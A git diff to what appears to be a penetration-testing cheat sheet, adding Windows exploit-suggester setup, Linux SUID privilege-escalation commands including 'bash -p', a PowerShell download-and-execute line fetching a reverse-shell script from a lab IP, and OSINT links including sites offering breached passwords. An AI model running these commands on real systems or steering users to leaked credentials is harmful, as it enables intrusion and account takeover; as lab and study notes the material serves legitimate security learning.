@@ -25,6 +25,7 @@
 23. [Reverse Engineering](#Reverse Engineering)
 24. [SQLInjection](#SQLInjection)
 25. [Wireshark](#Wireshark)
+26. [OSINT](#OSINT) 
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -617,8 +618,18 @@ netsh firewall show config
 * [jaws-enum.ps1](https://github.com/411Hall/JAWS)
 
 ### Other
-* [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 * [exploit suggester (metasploit)](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
+ 
+### [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+this script uses python2 which can lead to issues. create virtualenv and make sure you are using xlrd version 1.2.0
+```
+virtualenv -p /usr/bin/python2 venv
+source venv/bin/activate
+pip install xlrd==1.2.0
+./windows-exploit-suggester.py --database 2020-12-12-mssb.xls --systeminfo sysinfo.txt
+```
+
+
 
 ## [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
@@ -628,6 +639,10 @@ netsh firewall show config
 
 
 # Linux Privilege Escalation
+* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
+* https://payatu.com/guide-linux-privilege-escalation
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
+ 
 ## Get Capabilities
 ```
 /sbin/getcap -r / 2>/dev/null
@@ -636,6 +651,7 @@ netsh firewall show config
 Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 
 
 ## Setuid bits
+* https://gtfobins.github.io/
 ``` 
 # Find SUID files
 find / -user root -perm -4000 2>/dev/null
@@ -658,6 +674,13 @@ mark@node:~$ /tmp/manununu -p # -p priviliged    Do not attempt to reset effecti
 manununu-4.3$ whoami
 tom
 ```
+
+### Example (bash)
+``` 
+find / -perm -u=s -type f 2>/dev/null
+bash -p
+```
+
 
 # SMTP
 ## Extract Mails from Server using Telnet (Authenticated, IMAP)
@@ -743,6 +766,8 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > sh
 ## Windows
 ```
 powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
+
+c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
 ```
 
 # RSA
@@ -957,6 +982,16 @@ sqlmap -r sqlpanel.request --dbms=sqlite --dump-all --tamper=space2comment
 * http.request.method == GET
 
 
+# OSINT
+* https://namechk.com/
+* https://whatsmyname.app/,
+* https://namecheckup.com/
+* https://github.com/WebBreacher/WhatsMyName
+* https://github.com/sherlock-project/sherlock
 
+## Search for breaches
+* https://haveibeenpwned.com/
+* https://scylla.sh    # provides password, free
+* https://dehashed.com/   # provides password, paid
 
 
